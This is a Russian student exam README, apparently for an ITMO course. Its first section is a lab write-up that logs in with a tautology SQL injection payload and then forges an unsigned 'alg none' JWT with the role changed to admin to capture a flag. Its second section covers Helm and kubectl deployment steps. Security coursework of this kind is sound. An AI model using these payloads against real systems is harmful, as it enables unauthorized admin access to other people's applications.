# К экзамену

## Обеспечение защиты процессов разработки

### Задание

Необходимо зайти под админской УЗ по указанному в задании адресу, используя уязвимости.

### Решение

[Tautology-Based SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection).

В поля вставила:

```sql
admin' OR '1'='1
```

Предположительно, в SQL сработало так:

```sql
...
WHERE username = 'admin' OR '1'='1'
AND password = 'admin' OR '1'='1';
```

В этом случае получается, что значение всегда истинно.

Результат:

![скриншот](images/itmo_profile.png)

Далее необходимо найти JWT:

Для этого нужно перейти в консоль разработчика (F12) -> Application -> Cookies. JWT:

```base64
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJzdHVkZW50IiwibmFtZSI6IklUTU8gU3R1ZGVudCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzgxOTczNDA3fQ.
```

Необходимо выполнить декодирование второй части payload в формате base64

После декодирования: `{"sub":"1","username":"student","name":"ITMO Student","role":"user","iat":1781973407}`

Она совпадает с тем, что указано выше. Далее меняем роль на `admin`, шифруем в base64 и добавляем первую часть. Вставляем в консоль.

```base64
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJzdHVkZW50IiwibmFtZSI6IklUTU8gU3R1ZGVudCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MTk3MzQwN30=.
```

Результат:

![скриншот](images/itmo_profile_admin.png)

Полученный ключ `ITMO{sql_injection_to_unsigned_jwt_admin}`

## Облачные и кластерные технологии

### Требования

- кластер (либо локально minikube)
- kubectl
- helm

### Запуск

Перейти в папку exam-web и запустить `helm install exam-web .`

Начнется разворачивание ресурсов. Проверить ресурсы можно так: `kubectl get all -n exam-k8s`

Далее необходимо прокинуть порт `kubectl -n exam-k8s port-forward service/exam-web-service 8080:8080` и убедиться, что команда в терминале `curl http://localhost:8080` отдает html-страницу.

Для обновления ресурсов необходимо выполнить `helm upgrade exam-web .`

### Пример работы

![resources](images/exam_k8s_resources.png)